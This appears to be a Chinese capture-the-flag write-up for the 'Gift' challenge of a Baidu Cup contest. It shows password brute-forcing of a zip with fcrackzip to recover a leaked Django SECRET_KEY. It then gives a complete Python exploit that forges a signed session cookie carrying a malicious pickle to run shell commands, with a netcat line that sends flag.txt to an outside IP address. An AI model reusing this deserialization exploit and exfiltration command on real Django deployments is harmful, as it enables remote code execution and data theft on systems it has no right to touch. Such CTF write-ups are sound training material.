# 百度杯十月场 Gift
打开题目，post发get包,得到报错`More information is available with DEBUG=True.`，发现是django
```
POST / HTTP/1.1
Host: c0a0e53c0f2d4f4fa60e8850469e05c794f99e0dbd734ea1.changame.ichunqiu.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

github上找到压缩文件，破解密码解压发现是django的secret key

```
# 根据提示生成生日字典
python pydictor.py -plug birthday 19900101 20141231 --len 8 8
# 使用字典爆破压缩包，密码是20001111
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u crack_this.zip
```

找到django命令执行poc,然后命令执行get到flag
> 这里面有一个tcp无法
```
# !/usr/bin/env python
# -*- coding:utf-8 -*-

import os
import requests
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import pickle

def session_gen(SECRET_KEY,command = 'ping -n 3 baidu.com',):
    class Run(object):
        def __reduce__(self):
            #return (os.system,('ping test.0y0.link',))
            return (os.system,(command,))
    SECRET_KEY = SECRET_KEY
    sess = signing.dumps(Run(), key = SECRET_KEY,serializer=PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
    print sess
    session = 'sessionid={0}'.format(sess)
    return session

def exp(url,SECRET_KEY,command):

    headers = {'Cookie':session_gen(SECRET_KEY,command)}
    proxy = {"http":"http://127.0.0.1:8080"}#设置为burp的代理方便观察请求包
    response = requests.get(url,headers= headers,proxies = proxy)
    #print response.content

if __name__ == '__main__':
    url = 'http://00c50c9507e542faaa207fce86cce2ab2c6b6da510204f61.changame.ichunqiu.com/'
    SECRET_KEY = 'oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&j+#_+s-9=xcieci'
    command = 'cat flag.txt | nc -4u -w1 45.76.101.190 4444'
    exp(url,SECRET_KEY,command)
```